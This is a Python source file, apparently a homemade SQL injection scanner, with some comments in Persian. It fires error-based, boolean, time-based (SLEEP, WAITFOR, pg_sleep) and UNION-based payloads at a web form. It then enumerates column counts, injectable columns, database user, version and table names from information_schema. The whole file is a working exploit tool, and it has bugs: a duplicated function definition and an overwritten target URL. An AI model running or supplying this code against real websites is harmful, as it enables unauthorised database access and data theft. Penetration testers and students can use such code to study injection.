import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time

# Payloads for SQLi testing
test_payloads = [
    "'", "\"", "'--", "\"--", "'#", "\"#", 
    "' or '1'='1", "\" or \"1\"=\"1\"",
    "' OR 1=1--", "\" OR 1=1--", "' OR 'a'='a", "\" OR \"a\"=\"a\""
]


def starter(url, session):
    print("[*] Starting SQL Injection scanner...")
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find("form")

    if not form:
        print("[!] No form found at this URL.")
        return

    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all(["input", "select", "textarea"])

    form_data = {}
    testable_fields = []

    print("[*] Extracting input fields for testing...")
    seen = set()

    for input_tag in inputs:
        name = input_tag.get("name")
        if not name or name in seen:
            continue
        seen.add(name)

        input_type = input_tag.name if input_tag.name != "input" else input_tag.get("type", "text").lower()
        value = input_tag.get("value", "")

        print(f"  [DEBUG] Field: {name}, type: {input_type}")

        ignored_types = ["submit", "hidden", "button", "checkbox", "radio"]

        if input_type not in ignored_types:
            form_data[name] = "test"
            testable_fields.append(name)
        else:
            form_data[name] = value

    if not testable_fields:
        print("[!] No testable input fields found.")
        return

    if not action or action.strip() == "#":
        print("[!] Form uses placeholder action (#). Using page URL as target.")
        target_url = url
    else:
        target_url = urljoin(url, action)


    target_url = urljoin(url, action)
    print(f"[*] Target form URL: {target_url}")
    print(f"[*] Testable fields: {testable_fields}")

    sqli_detected = False

    for field in testable_fields:
        for payload in test_payloads:
            data = form_data.copy()
            data[field] = payload
            if method == "post":
                r = session.post(target_url, data=data)
            else:
                r = session.get(target_url, params=data)

            if any(err in r.text.lower() for err in ["sql", "syntax error", "warning"]):
                print(f"[!] Potential SQL Injection detected with payload: {payload} in field: {field}")
                sqli_detected = True
                break

        if sqli_detected:
            test_boolean_based_sqli(session, url, method, target_url, form_data, field)
            test_time_based_sqli(session, method, target_url, form_data, field)
            col_count = find_column_count(session, method, target_url, form_data, field)
            if col_count:
                inj_col = find_injectable_column(session, method, target_url, form_data, field, col_count)
                if inj_col:
                    extract_database_info(session, method, target_url, form_data, field, col_count, inj_col)
        else:
            print(f"[-] No SQLi detected in field: {field} — skipping further tests.")


def test_boolean_based_sqli(session, url, method, target_url, form_data, field):
    true_payload = "' OR 1=1--"
    false_payload = "' OR 1=2--"

    print(f"\n[*] Starting Boolean-based Blind SQLi test on field: {field}...")

    data_true = form_data.copy()
    data_true[field] = true_payload

    data_false = form_data.copy()
    data_false[field] = false_payload

    if method == "post":
        r1 = session.post(target_url, data=data_true)
        r2 = session.post(target_url, data=data_false)
    else:
        r1 = session.get(target_url, params=data_true)
        r2 = session.get(target_url, params=data_false)

    len1 = len(r1.text)
    len2 = len(r2.text)

    print(f"[*] Response length with TRUE payload: {len1}")
    print(f"[*] Response length with FALSE payload: {len2}")

    if abs(len1 - len2) > 30:
        print(f"[+] Possible Boolean-based SQLi on field: {field}")
    else:
        print(f"[-] No clear Boolean-based SQLi detected on field: {field}")


def test_time_based_sqli(session, method, target_url, form_data, field):
    print(f"\n[*] Starting Time-based Blind SQLi test on field: {field}...")

    payloads = [
        "' OR SLEEP(5)--",
        "\" OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' || pg_sleep(5)--",
    ]

    for payload in payloads:
        data = form_data.copy()
        data[field] = payload

        start = time.time()
        if method == "post":
            session.post(target_url, data=data)
        else:
            session.get(target_url, params=data)
        end = time.time()

        delay = end - start
        print(f"[*] Payload: {payload} → response time: {delay:.2f} sec")

        if delay > 4:
            print(f"[+] Possible Time-based SQLi on field: {field} using payload: {payload}")
            return  # فقط اولین موفقیتو گزارش کن
    print(f"[-] No Time-based SQLi detected on field: {field}")



def extract_database_info(session, method, target_url, form_data, field, col_count, inj_col):
    print(f"\n[*] Extracting DB info using UNION-based SQLi (col={col_count}, injectable={inj_col})...")

    base_payload = ["null"] * col_count
    inj_index = inj_col - 1  # صفر-اندیس
    fields_to_extract = ["user()", "database()", "version()"]

    for keyword in fields_to_extract:
        base_payload[inj_index] = keyword
        payload = f"' UNION SELECT {', '.join(base_payload)}-- -"
        data = form_data.copy()
        data[field] = payload

        if method == "post":
            r = session.post(target_url, data=data)
        else:
            r = session.get(target_url, params=data)

        print(f"[+] Trying to extract {keyword} → check below:")
        snippet = r.text[:2000]  # فقط اول صفحه برای چک کردن دستی
        print(snippet)
        print("-" * 40)

    # استخراج نام جدول‌ها از information_schema
    base_payload[inj_index] = "table_name"
    base_payload[(inj_index + 1) % col_count] = "'information_schema.tables'"
    payload = f"' UNION SELECT {', '.join(base_payload)} FROM information_schema.tables-- -"
    data = form_data.copy()
    data[field] = payload

    print(f"[+] Trying to extract table names...")
    if method == "post":
        r = session.post(target_url, data=data)
    else:
        r = session.get(target_url, params=data)

    print(r.text[:2000])  # باز هم فقط ابتدای پاسخ برای بررسی


def find_column_count(session, method, url, form_data, field):
    print("[*] Finding number of columns using ORDER BY...")
    for i in range(1, 21):  # تا 20 ستون تست می‌کنیم
        payload = f"' ORDER BY {i}--"
        data = form_data.copy()
        data[field] = payload

        if method == "post":
            r = session.post(url, data=data)
        else:
            r = session.get(url, params=data)

        print(f"[DEBUG] ORDER BY {i} → length: {len(r.text)}")

        if "unknown column" in r.text.lower() or "error" in r.text.lower():
            print(f"[+] Column count found: {i - 1}")
            return i - 1

    print("[-] Could not determine column count.")
    return None


def find_injectable_column(session, method, url, form_data, field, column_count):
    print("[*] Testing for injectable column using UNION SELECT...")
    for i in range(1, column_count + 1):
        cols = ["NULL"] * column_count
        cols[i - 1] = "'injected'"
        payload = f"' UNION SELECT {','.join(cols)}--"
        data = form_data.copy()
        data[field] = payload

        if method == "post":
            r = session.post(url, data=data)
        else:
            r = session.get(url, params=data)

        if "injected" in r.text:
            print(f"[+] Injectable column found: {i}")
            return i
    print("[-] No injectable column found.")
    return None


def extract_database_info(session, method, url, form_data, field, column_count, inj_col):
    print("[*] Extracting database info using UNION SELECT...")
    cols = ["NULL"] * column_count
    cols[inj_col - 1] = "@@version"
    payload = f"' UNION SELECT {','.join(cols)}--"
    data = form_data.copy()
    data[field] = payload

    if method == "post":
        r = session.post(url, data=data)
    else:
        r = session.get(url, params=data)

    print("[+] Server Response Snippet:")
    print(r.text[:500])  # فقط اولش رو چاپ کن
    if "5." in r.text or "MariaDB" in r.text or "MySQL" in r.text:
        print("[+] Detected database info in response!")
    else:
        print("[-] No obvious database info found.")
